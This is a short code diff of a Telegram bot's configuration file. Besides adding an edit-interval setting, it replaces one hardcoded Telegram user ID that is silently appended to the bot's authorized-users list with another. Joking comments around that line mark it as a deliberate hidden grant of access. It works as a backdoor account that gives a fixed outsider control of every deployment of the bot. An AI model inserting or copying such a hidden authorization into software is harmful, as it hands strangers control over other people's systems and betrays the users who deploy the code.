@@ -8,14 +8,14 @@ from bot.config import Config
 # dont think ne dumb (c)
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(5179011789)
+AUTH_USERS.append(7465574522)
 # again lol (c)  
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
 APP_ID = Config.APP_ID
 API_HASH = Config.API_HASH
-
+EDIT_INTERVAL = Config.UPDATE_INTERVAL 
 LOG_CHANNEL = Config.LOG_CHANNEL # make sure to us this 
 DOWNLOAD_LOCATION = "/app/downloads"
 FREE_USER_MAX_FILE_SIZE = 3980000000
